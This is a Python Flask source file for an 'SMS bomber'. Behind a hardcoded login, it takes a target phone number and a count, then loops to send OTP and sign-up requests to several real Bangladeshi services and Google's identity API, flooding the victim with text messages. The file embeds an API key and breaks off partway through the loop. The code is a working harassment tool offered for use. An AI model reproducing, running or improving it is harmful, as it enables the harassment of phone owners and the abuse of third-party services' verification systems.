import os
from flask import Flask, request, render_template_string
import requests
import time

app = Flask(__name__)

USERNAME = "Hoker Hd"
PASSWORD = "Sabit99"

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #1f4037, #99f2c8);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            animation: fadeIn 1s ease-in-out;
        }

        .login-container {
            background: rgba(0, 0, 0, 0.3);
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        img {
            width: 60px;
            animation: bounce 1.5s infinite;
        }

        input, button {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
        }

        button {
            background: #00ffcc;
            cursor: pointer;
        }

        .error {
            color: red;
            font-size: 14px;
        }

        @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
        @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock">
        <h2>🔐 Secure Login</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}
    </div>
</body>
</html>
"""

SMS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SMS Sender</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #141e30, #243b55);
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            animation: fadeIn 1s ease-in-out;
        }

        .form-container {
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
            text-align: center;
        }

        input, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
        }

        button {
            background: #00ffd5;
            color: #000;
            cursor: pointer;
        }

        a.telegram {
            margin-top: 20px;
            text-decoration: none;
            color: #00ffd5;
            font-size: 18px;
        }

        @keyframes fadeIn {
            from {opacity: 0; transform: translateY(-20px);}
            to {opacity: 1; transform: translateY(0);}
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>📲 SMS BOMBER BY SABIT</h2>
        <form method="POST" action="/send-sms">
            <input type="text" name="number" placeholder="Enter Phone Number" required>
            <input type="number" name="amount" placeholder="Enter Amount" required>
            <button type="submit">🚀 Send</button>
        </form>
        <a href="https://t.me/sabitcommunity" class="telegram" target="_blank">📢 Join Sabit Community</a>
    </div>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(LOGIN_HTML)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    if username == USERNAME and password == PASSWORD:
        return render_template_string(SMS_PAGE)
    else:
        return render_template_string(LOGIN_HTML, error="❌ Wrong username or password!")

@app.route("/send-sms", methods=["POST"])
def send_sms():
    number = request.form.get("number")
    amount = int(request.form.get("amount"))
    success_count = 0

    for i in range(amount):
        try:
            print(f"Sending {i+1} to {number}")

            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}")

            requests.post(
                "https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode?key=AIzaSyDArA90pD_7MdxaqQ2p1bHG92o4RTMUH0s",
                json={"phoneNumber": "+88" + number, "recaptchaToken": "test"}
            )

            requests.post(
                "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPhoneNumber?key=AIzaSyDArA90pD_7MdxaqQ2p1bHG92o4RTMUH0s",
                json={"sessionInfo": "fake", "code": "123456"}
            )

            requests.post(
                "https://cineplex-ticket-api.cineplexbd.com/api/v1/register",
                json={
                    "name": "Test", "phone": number,
                    "email": f"{number}@test.com", "password": "123456"
                }
            )

            requests.post(
                "https://api-gateway.sundarbancourierltd.com/graphql",
                json={"query": f'query {{ getOtp(phone: "{number}") {{ status message }} }}'}
            )

            requests.post("https://bkwebsitethc.grameenphone.com/api/get-advertise-block",
                          json={"phone_number": number})

            requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp",
                          json={"phone": number})
